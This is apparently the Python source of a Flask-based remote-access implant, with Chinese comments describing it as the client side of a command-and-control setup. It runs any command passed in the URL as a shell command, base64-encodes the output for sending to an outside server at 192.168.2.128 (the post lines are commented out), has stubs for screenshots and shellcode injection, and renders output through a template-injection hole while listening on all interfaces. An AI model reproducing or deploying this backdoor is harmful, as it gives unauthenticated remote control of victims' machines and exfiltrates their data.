import flask
from flask import *
import requests
import random
import subprocess
import base64
import socket
import time
import requests
import ctypes


app = Flask(__name__)


def get_host_ip():

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    finally:
        s.close()

    return ip



#客户端
@app.route('/cmd/<name>')
def cmd(name):
    if name == "snap":
        #stage.image()
        pass
    elif name == "msf":
        #stage.shellcode('remote_inject.py')
        pass
    else:
        #先对name也就是服务端刚才的cmd做个解密 重新赋值一个变量
        screenData = subprocess.Popen(name, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)  # stage
        # subprocess最后完成的内容是一个文件对象
        # data：我们输入的命令，shell:1.识别计算机的操作系统|2.根据操作系统自动调用命令行
        # 文件的处理流程：打开文件，编辑文件，关闭文件
        dem_stdout=''
        while True:

            # 不知道到底有多少行就直接用while循环来做每一行的处理
            line = screenData.stdout.readline()
            print(line)
            # 一行一行地去读取文件内容
            m_stdout = line.decode('gbk')
            # 解码

            if line == b'':
                # 如果一行文本什么都没有
                screenData.stdout.close()
                break
            # 跳出文件处理的循环但是不是推出链接
            dem_stdout = line.decode('gbk').encode('utf-8')
            print(dem_stdout)
            #dem_stdout这里是原始的命令执行的结果
            #我们只需要将这里添加点编码发过去就可以了
            #是client啊 别搞错了

            bdem_stdout = base64.b64encode(dem_stdout)

            print(m_stdout)
            #time.sleep(1)

            #requests.post('http://192.168.2.128:90/result/',data={'name':bdem_stdout})

            # 跳出文件处理的循环但是不是推出链接

    #return str(m_stdout)
    return flask.render_template_string(str(m_stdout))





@app.route('/snapshot/<name>')
def snapshot(name):
    #stage.image()
    return str("image")

@app.route('/heartbeat')
def heartbeat():
    host = get_host_ip()
    return flask.render_template_string(str(host))
    #requests.post('http://192.168.2.128:90/info/', data={'uid': host})




if __name__ == '__main__':
    #heartbeat()
    app.run('0.0.0.0',9999,True)
